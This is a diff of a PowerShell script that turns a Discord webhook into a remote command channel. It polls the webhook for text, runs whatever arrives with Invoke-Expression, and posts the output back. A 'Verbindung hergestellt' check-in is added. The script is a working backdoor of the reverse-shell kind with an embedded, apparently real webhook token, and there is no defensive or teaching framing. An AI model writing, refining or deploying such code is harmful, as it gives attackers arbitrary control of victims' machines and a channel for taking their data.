@@ -1,22 +1,21 @@
-$webhookUrl = "https://discord.com/api/webhooks/1195732732693717112/KkX_ctFkiqFGDQwCR_UhhwDh5kAD-27vdiDdEw8sYPhFvKNoGsq39Wxk8MQhvC9GxaGv"
+$webhookURL = 'https://discord.com/api/webhooks/1195732732693717112/KkX_ctFkiqFGDQwCR_UhhwDh5kAD-27vdiDdEw8sYPhFvKNoGsq39Wxk8MQhvC9GxaGv'
 
-function Execute-Command {
+function Send-DiscordMessage {
     param (
-        [string]$command
+        [string]$message
     )
 
-    $payload = @{
-        content = $command
-    } | ConvertTo-Json
+    $body = @{
+        content = $message
+    }
 
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    Invoke-RestMethod -Uri $webhookURL -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
 }
 
+Send-DiscordMessage "Verbindung hergestellt."
+
 while ($true) {
-    $command = (Invoke-RestMethod -Uri $webhookUrl).content
-    if ($command -ne $null) {
-        $output = Invoke-Expression -Command $command 2>&1
-        Execute-Command -command $output
-    }
-    Start-Sleep -Seconds 5
+    $command = (Invoke-RestMethod -Uri $webhookURL).content
+    $output = Invoke-Expression $command
+    Send-DiscordMessage $output
 }
